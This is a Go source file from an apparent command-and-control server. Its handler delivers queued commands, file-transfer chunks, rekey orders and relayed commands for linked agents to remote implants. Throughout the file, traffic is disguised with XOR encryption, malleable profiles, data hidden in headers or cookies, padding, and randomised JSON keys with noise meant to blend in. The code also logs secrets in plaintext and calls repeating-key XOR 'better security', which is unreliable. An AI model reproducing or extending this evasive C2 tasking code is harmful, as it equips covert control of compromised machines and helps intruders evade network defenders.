// internal/agent/listeners/handler_get.go
package listeners

import (
	"c2/internal/common/config"
	"c2/internal/common/interfaces"
	"c2/internal/common/transforms"
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// handleGetRequest processes GET requests from agents
// responseProfile is optional - if set, applies transforms to response
func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBuffer interfaces.CommandBuffer, responseProfile *config.ServerResponseProfile) {
	log.Printf("[GetRequest] Looking up client ID: %q", clientID)

	// Print the current active connections
	m.activeConnections.mutex.RLock()
	log.Printf("[GetRequest] Active connections:")
	for id, conn := range m.activeConnections.connections {
		log.Printf("  ID: %s, Protocol: %s", id, conn.Protocol)
	}
	m.activeConnections.mutex.RUnlock()

	// Verify active connection
	activeConn, err := m.activeConnections.GetConnection(clientID)
	if err != nil {
		log.Printf("[GetRequest] Failed to find active connection for clientID: %q", clientID)
		http.Error(w, "Connection not found", http.StatusUnauthorized)
		return
	}

	// Record heartbeat for batched database update (async, non-blocking)
	// This replaces the synchronous UPDATE that was causing DB contention
	if m.heartbeatBatcher != nil {
		m.heartbeatBatcher.RecordHeartbeat(clientID)
		log.Printf("[GetRequest] Recorded heartbeat for agent %s (batched)", clientID)
	} else {
		// Fallback to synchronous update if batcher not initialized
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		_, err = m.db.ExecContext(ctx, `
			UPDATE connections
			SET lastSEEN = CURRENT_TIMESTAMP
			WHERE newclientID = $1`,
			clientID,
		)
		if err != nil {
			log.Printf("[GetRequest] Failed to update lastSEEN in database: %v", err)
		} else {
			log.Printf("[GetRequest] Successfully updated lastSEEN in database for agent %s", clientID)
		}
	}

	// Broadcast last seen update via WebSocket
	if err := m.commandBuffer.BroadcastLastSeen(clientID, time.Now().Unix()); err != nil {
		log.Printf("[GetRequest] Failed to broadcast last seen update: %v", err)
		// Continue since this isn't critical
	} else {
		log.Printf("[GetRequest] Successfully broadcast last seen for agent %s", clientID)
	}

	log.Printf("[GetRequest] Current secret1 for clientID %q: %s", clientID, activeConn.Secret1)
	log.Printf("[GetRequest] Current secret2 for clientID %q: %s", clientID, activeConn.Secret2)

	// Retrieve commands for the clientID
	log.Printf("[GetRequest] Attempting to get commands for clientID: %q", clientID)
	commands, exists := cmdBuffer.GetCommand(clientID)

	// Load unified link malleable configuration (shared between SMB and TCP)
	linkMalleable, cfgErr := config.GetLinkMalleable()
	if cfgErr != nil {
		log.Printf("[GetRequest] Warning: Failed to load link config, using defaults: %v", cfgErr)
	}

	var responseToEncrypt map[string]interface{}

	// Get malleable field names from response profile (with defaults)
	statusField := "status"
	dataField := "data"
	noCommandsValue := "no_commands"
	commandReadyValue := "command_ready"

	if responseProfile != nil {
		if responseProfile.StatusField != "" {
			statusField = responseProfile.StatusField
		}
		if responseProfile.DataField != "" {
			dataField = responseProfile.DataField
		}
		log.Printf("[GetRequest] Using profile field names: status=%q, data=%q", statusField, dataField)
	}

	if !exists || len(commands) == 0 {
		log.Printf("[GetRequest] No commands found for clientID: %q", clientID)
		responseToEncrypt = map[string]interface{}{
			statusField: noCommandsValue,
		}

		// Even if no commands for edge agent, check for link responses
		handshakes, linkCmds, linkErr := m.getPendingLinkResponsesSeparate(clientID)
		if linkErr != nil {
			log.Printf("[GetRequest] Warning: Failed to get link responses: %v", linkErr)
		} else {
			if len(handshakes) > 0 {
				log.Printf("[GetRequest] Including %d handshake responses for edge agent %s", len(handshakes), clientID)
				responseToEncrypt[linkMalleable.LinkHandshakeResponseField] = handshakes
			}
			if len(linkCmds) > 0 {
				log.Printf("[GetRequest] Including %d link commands for edge agent %s", len(linkCmds), clientID)
				responseToEncrypt[linkMalleable.LinkCommandsField] = linkCmds
			}
		}
	} else {
		// Don't log the full commands with base64 data
		// Instead, log useful metadata about the commands
		log.Printf("[GetRequest] Retrieved %d command(s) for clientID %q (total size: %d bytes)",
			len(commands), clientID, len(commands[0]))

		// Parse commands to log summary info
		var cmdData []struct {
			Command      string `json:"command"`
			CommandDBID  int    `json:"command_db_id"`
			Filename     string `json:"filename"`
			CurrentChunk int    `json:"currentChunk"`
			TotalChunks  int    `json:"totalChunks"`
			Data         string `json:"data"`
		}

		if err := json.Unmarshal([]byte(commands[0]), &cmdData); err == nil {
			for i, cmd := range cmdData {
				dataLen := len(cmd.Data)
				if cmd.Command == "upload" && dataLen > 0 {
					log.Printf("[GetRequest]   Command %d: %s (chunk %d/%d, %d bytes data)",
						i+1, cmd.Command, cmd.CurrentChunk, cmd.TotalChunks, dataLen)
				} else if cmd.Command == "download" {
					log.Printf("[GetRequest]   Command %d: %s %s (chunk %d/%d)",
						i+1, cmd.Command, cmd.Filename, cmd.CurrentChunk, cmd.TotalChunks)
				} else {
					log.Printf("[GetRequest]   Command %d: %s", i+1, cmd.Command)
				}
			}
		}

		// Check if this is a rekey command
		var rekeyCheck []struct {
			Command     string `json:"command"`
			CommandDBID int    `json:"command_db_id"`
		}

		if err := json.Unmarshal([]byte(commands[0]), &rekeyCheck); err == nil {
			if len(rekeyCheck) > 0 {
				firstCommand := strings.ToLower(strings.TrimSpace(rekeyCheck[0].Command))

				// Check if it's a rekey command
				if firstCommand == "rekey" {
					log.Printf("[GetRequest] Rekey command detected for clientID: %q", clientID)

					// Get rekey status VALUE from profile or malleable config
					// Note: Uses the outer statusField/dataField for field NAMES (from profile)
					rekeyStatusValue := "rekey_required"
					idField := "command_db_id"

					// First check if profile has a custom rekey value
					if responseProfile != nil && responseProfile.RekeyValue != "" {
						rekeyStatusValue = responseProfile.RekeyValue
						if responseProfile.CommandIDField != "" {
							idField = responseProfile.CommandIDField
						}
						log.Printf("[GetRequest] Using profile rekey value: %q, id field: %s", rekeyStatusValue, idField)
					} else {
						// Fall back to malleable config
						malleableConfig, err := config.GetMalleableConfig()
						if err != nil {
							log.Printf("[GetRequest] Warning: Failed to load malleable config, using defaults: %v", err)
						}
						if malleableConfig != nil {
							rekeyStatusValue = malleableConfig.RekeyCommand
							idField = malleableConfig.RekeyIDField
							log.Printf("[GetRequest] Using malleable rekey value: %q, id field: %s", rekeyStatusValue, idField)
						}
					}

					responseToEncrypt = map[string]interface{}{
						statusField: rekeyStatusValue,
						dataField:   "",
						idField:     rekeyCheck[0].CommandDBID,
					}

					// Delete the command from buffer
					cmdBuffer.DeleteCommand(clientID)
					log.Printf("[GetRequest] Rekey command prepared for XOR encryption: %q", clientID)
				} else {
					// Normal command - continue with regular processing
					goto normalCommand
				}
			} else {
				goto normalCommand
			}
		} else {
			goto normalCommand
		}
	}

	// Send XOR encrypted response for all cases
	if responseToEncrypt != nil {
		m.sendXOREncryptedResponse(w, responseToEncrypt, clientID, activeConn, responseProfile)
		return
	}

normalCommand:
	// Normal command processing - encrypt the command
	encrypted, err := encryptWithNonce(commands[0], activeConn.Secret1)
	if err != nil {
		log.Printf("[GetRequest] Failed to encrypt command for clientID %q: %v", clientID, err)
		http.Error(w, "Encryption error", http.StatusInternalServerError)
		return
	}

	// Log encrypted data size instead of content
	log.Printf("[GetRequest] Encrypted command for clientID %q: %d bytes", clientID, len(encrypted))

	// Prepare response for XOR encryption using profile's field names
	responseToEncrypt = map[string]interface{}{
		statusField: commandReadyValue,
		dataField:   encrypted,
	}

	// Check for pending link responses (handshake responses + commands for linked agents)
	// Uses malleable field names for handshake responses and link commands
	handshakes, linkCmds, err := m.getPendingLinkResponsesSeparate(clientID)
	if err != nil {
		log.Printf("[GetRequest] Warning: Failed to get link responses: %v", err)
	} else {
		if len(handshakes) > 0 {
			log.Printf("[GetRequest] Including %d handshake responses for edge agent %s", len(handshakes), clientID)
			responseToEncrypt[linkMalleable.LinkHandshakeResponseField] = handshakes
		}
		if len(linkCmds) > 0 {
			log.Printf("[GetRequest] Including %d link commands for edge agent %s", len(linkCmds), clientID)
			responseToEncrypt[linkMalleable.LinkCommandsField] = linkCmds
		}
	}

	// Send XOR encrypted response
	m.sendXOREncryptedResponse(w, responseToEncrypt, clientID, activeConn, responseProfile)

	// Rotate secrets
	h := hmac.New(sha256.New, []byte(activeConn.Secret2))
	h.Write([]byte(activeConn.Secret1))
	newSecret := fmt.Sprintf("%x", h.Sum(nil))

	activeConn.Secret2 = activeConn.Secret1
	activeConn.Secret1 = newSecret

	log.Printf("[GetRequest] Rotated secrets for clientID %q", clientID)
	log.Printf("[GetRequest] New secret1: %s", activeConn.Secret1)
	log.Printf("[GetRequest] New secret2: %s", activeConn.Secret2)

	cmdBuffer.DeleteCommand(clientID)
	log.Printf("[GetRequest] Command deleted for clientID: %q", clientID)
}

// sendXOREncryptedResponse encrypts and sends the response
// responseProfile is optional - if set with Data DataBlock, applies transforms to the response
func (m *Manager) sendXOREncryptedResponse(w http.ResponseWriter, response map[string]interface{}, clientID string, conn *ActiveConnection, responseProfile *config.ServerResponseProfile) {
	// Derive XOR key using the connection's rotating secret
	xorKey := deriveXORKey(clientID, conn.Secret1)

	// Marshal the response to JSON
	jsonData, err := json.Marshal(response)
	if err != nil {
		log.Printf("[GetRequest] Failed to marshal response: %v", err)
		http.Error(w, "Internal error", http.StatusInternalServerError)
		return
	}

	// XOR encrypt the entire JSON
	encryptedData := xorEncryptBytes(jsonData, xorKey)

	// Debug: Log profile state
	if responseProfile == nil {
		log.Printf("[GetRequest] DEBUG: responseProfile is nil")
	} else {
		log.Printf("[GetRequest] DEBUG: responseProfile=%s, Data=%v, TransformCount=%d",
			responseProfile.Name,
			responseProfile.Data != nil,
			func() int {
				if responseProfile.Data != nil {
					return len(responseProfile.Data.Transforms)
				}
				return 0
			}())
	}

	// Check if we should apply response transforms
	if responseProfile != nil && responseProfile.Data != nil && len(responseProfile.Data.Transforms) > 0 {
		// Apply transforms to the encrypted data
		// Uses static profile XOR key - agent has matching key embedded at build time
		xforms := convertConfigTransforms(responseProfile.Data.Transforms)
		log.Printf("[GetRequest] Applying %d response transforms for client %s", len(xforms), clientID)

		result, err := transforms.Apply(encryptedData, xforms)
		if err != nil {
			log.Printf("[GetRequest] ERROR: Failed to apply response transforms: %v - falling back to legacy", err)
			// Fall back to non-transformed response
		} else {
			log.Printf("[GetRequest] Response transforms applied successfully, output size: %d bytes", len(result.Data))
			encryptedData = result.Data

			// Add padding length headers if random transforms were used
			if result.PrependLength > 0 {
				w.Header().Set("X-Pad-Pre", strconv.Itoa(result.PrependLength))
			}
			if result.AppendLength > 0 {
				w.Header().Set("X-Pad-App", strconv.Itoa(result.AppendLength))
			}

			// Check output location - if not body, place accordingly
			locType, name := transforms.ParseOutput(responseProfile.Data.Output)
			if locType != "body" {
				// Place transformed data in header/cookie and send empty body
				switch locType {
				case "header":
					w.Header().Set(name, base64.StdEncoding.EncodeToString(encryptedData))
					w.Header().Set("Content-Type", "application/json")
					w.Write([]byte("{}"))
					return
				case "cookie":
					http.SetCookie(w, &http.Cookie{
						Name:  name,
						Value: base64.StdEncoding.EncodeToString(encryptedData),
					})
					w.Header().Set("Content-Type", "application/json")
					w.Write([]byte("{}"))
					return
				}
			}
			// For body output with transforms, send transformed data directly
			// (without JSON wrapping - the transforms ARE the obfuscation)
			if responseProfile.ContentType != "" {
				w.Header().Set("Content-Type", responseProfile.ContentType)
			} else {
				w.Header().Set("Content-Type", "application/octet-stream")
			}
			w.Write(encryptedData)
			return
		}
	}

	// Legacy: No transforms - use JSON wrapping with random keys for obfuscation
	log.Printf("[GetRequest] Using LEGACY JSON-wrapped response (no transforms or transform error)")
	// Generate random keys to obfuscate the response structure
	// Use 2-4 character keys that look like generic JSON
	keys := generateRandomKeys()

	// Send with randomized structure
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		keys[0]: base64.StdEncoding.EncodeToString(encryptedData),
		keys[1]: generateNoise(16), // Random noise field
		keys[2]: generateNoise(8),  // Another noise field
	})
}

// generateRandomKeys generates random short keys for JSON fields
func generateRandomKeys() []string {
	// Use common looking keys to blend in
	possibleKeys := []string{
		"d", "v", "r", "t", "m", "s", "p", "k", "x", "a", "b", "c",
		"id", "ts", "vr", "dt", "md", "st", "px", "ky", "ax", "bx",
		"val", "res", "tmp", "dat", "msg", "str", "pkg", "key", "aux",
	}

	// Randomly select 3 keys
	keys := make([]string, 3)
	used := make(map[int]bool)

	for i := 0; i < 3; i++ {
		for {
			b := make([]byte, 1)
			rand.Read(b)
			idx := int(b[0]) % len(possibleKeys)
			if !used[idx] {
				keys[i] = possibleKeys[idx]
				used[idx] = true
				break
			}
		}
	}

	return keys
}

// generateNoise generates random base64 noise for obfuscation
func generateNoise(length int) string {
	b := make([]byte, length)
	rand.Read(b)
	return base64.StdEncoding.EncodeToString(b)
}

// deriveXORKey creates a deterministic XOR key
func deriveXORKey(clientID, secret string) []byte {
	// Create a key that both server and payload can derive
	combined := clientID + ":" + secret
	hash := sha256.Sum256([]byte(combined))
	return hash[:32] // Use full hash for better security
}

// xorEncryptBytes encrypts byte array using XOR
func xorEncryptBytes(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// handleGetRequestWithProfile wraps handleGetRequest for profile-bound listeners
// It applies profile headers and passes the responseProfile for transform support
func (m *Manager) handleGetRequestWithProfile(w http.ResponseWriter, clientID string, cmdBuffer interfaces.CommandBuffer, responseProfile *config.ServerResponseProfile) {
	// Apply profile headers if provided
	if responseProfile != nil {
		for _, header := range responseProfile.Headers {
			w.Header().Set(header.Name, header.Value)
		}
	}
	// Delegate to handler with the response profile for transform support
	m.handleGetRequest(w, clientID, cmdBuffer, responseProfile)
}
